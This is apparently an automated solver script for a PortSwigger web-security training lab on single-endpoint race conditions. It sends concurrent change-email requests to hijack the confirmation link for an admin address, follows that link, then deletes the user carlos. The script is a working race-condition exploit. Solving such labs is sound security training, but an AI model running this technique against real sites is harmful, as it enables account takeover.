const { deleteCarlos, getCsrf, getExploitServerUrl, isSolved, labLogin, runLab, textContent } = require('./_common.cjs');

const TITLE = 'Single-endpoint race conditions';
const PATH = '/web-security/race-conditions/lab-race-conditions-single-endpoint';
const TARGET_EMAIL = 'carlos@ginandjuice.shop';
const MAX_ATTEMPTS = 40;

async function openEmailClient(page, labUrl) {
  for (const candidate of ['/email', '/email-client', '/emails']) {
    try {
      await page.goto(labUrl + candidate, { waitUntil: 'domcontentloaded', timeout: 15000 });
      const body = await textContent(page);
      if (body && !/not found/i.test(body)) return labUrl + candidate;
    } catch {}
  }

  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  const href = await page.evaluate(() => {
    return [...document.querySelectorAll('a[href]')].find((link) => /email client/i.test(link.textContent || '') || /\/email/i.test(link.getAttribute('href') || ''))?.href || null;
  });
  if (!href) throw new Error('Email client not found');
  return href.startsWith('http') ? href : new URL(href, labUrl).toString();
}

async function listInboxTargets(page, emailUrl) {
  await page.goto(emailUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  await page.waitForTimeout(500);
  const hrefs = await page.$$eval('a[href]', (links) => links.map((link) => link.getAttribute('href') || '').filter(Boolean));
  return [emailUrl, ...hrefs.map((href) => (href.startsWith('http') ? href : new URL(href, emailUrl).toString()))]
    .filter((value, index, array) => array.indexOf(value) === index)
    .slice(0, 20);
}

async function findClaimEmail(page, emailUrl, expectedRecipient) {
  const targets = await listInboxTargets(page, emailUrl);

  for (const target of targets) {
    await page.goto(target, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
    const body = await textContent(page);
    if (!body.includes(expectedRecipient) || !body.includes(TARGET_EMAIL)) continue;

    const href = await page.evaluate(() => {
      return [...document.querySelectorAll('a[href]')].find((link) => /\/confirm-email\?/i.test(link.getAttribute('href') || ''))?.href || null;
    });

    if (href) {
      return href.startsWith('http') ? href : new URL(href, target).toString();
    }

    const match = body.match(/\/confirm-email\?[^\s"'<>]+/i);
    if (match) return new URL(match[0], target).toString();
  }

  return null;
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');
    const exploitUrl = await getExploitServerUrl(page, labUrl);
    const exploitDomain = new URL(exploitUrl).hostname;
    const emailUrl = await openEmailClient(page, labUrl);

    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt += 1) {
      await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 });
      const csrf = await getCsrf(page);
      const ourEmail = `race-${attempt}-${Date.now() % 1000000}@${exploitDomain}`;

      await page.evaluate(async ({ csrf, ourEmail, targetEmail }) => {
        const build = (email) => {
          const body = new URLSearchParams();
          if (csrf) body.set('csrf', csrf);
          body.set('email', email);
          return body.toString();
        };

        await Promise.all([
          fetch('/my-account/change-email', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: build(ourEmail),
          }),
          fetch('/my-account/change-email', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: build(targetEmail),
          }),
        ]).catch(() => {});
      }, { csrf, ourEmail, targetEmail: TARGET_EMAIL });

      await page.waitForTimeout(1200);
      const confirmUrl = await findClaimEmail(page, emailUrl, ourEmail);
      console.log(`attempt ${attempt}: ${confirmUrl ? 'claim-email found' : 'miss'}`);

      if (!confirmUrl) continue;

      await page.goto(confirmUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
      await page.waitForTimeout(1000);
      await deleteCarlos(page, labUrl);
      if (await isSolved(page, labUrl)) return;
    }

    throw new Error('Did not capture a confirmation email for the admin invite address');
  },
});
